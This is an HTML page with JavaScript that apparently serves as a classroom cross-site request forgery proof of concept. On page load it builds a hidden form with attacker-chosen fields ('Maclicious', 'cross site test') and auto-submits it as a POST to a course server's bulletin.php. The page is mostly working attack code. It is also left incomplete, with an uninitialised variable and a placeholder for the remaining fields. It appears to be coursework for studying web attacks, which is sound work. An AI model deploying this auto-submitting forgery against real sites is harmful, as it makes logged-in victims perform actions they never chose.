<html>
<body>
<h1>
This page creates a form like the one in convert.php, fills fields and submits the form.
</h1>
<script>

function fill_and_send_form()
{ 
// Create a form element, set its attributes, and submit the form

// Create a <form> element.
var e = document.createElement("form");

// Set the attributes of the form
e.action = "http://cs5339.cs.utep.edu/team11/bulletin.php";
e.target = "_self"; // The response is displayed in the same frame
// Set the next two attributes to appropriate values
e.method = "post";

// Create a string with html to set hidden fields 
// corresponding to the edit user form
// with values chosen by the attacker. 
var form_fields;
form_fields += "<input type='hidden' name='title' value='Maclicious'>";
form_fields += "<input type='hidden' name='description' value='cross site test'>";

// (Continue with the other fields)

// Add the fields to the form
e.innerHTML = form_fields;

// Add the form to the current page.
document.body.appendChild(e);

//submit the form
e.submit();
}

// As soon as the page loads, create the form, fill it and submit it
window.onload = function() {fill_and_send_form();}
</script>

</body>
</html>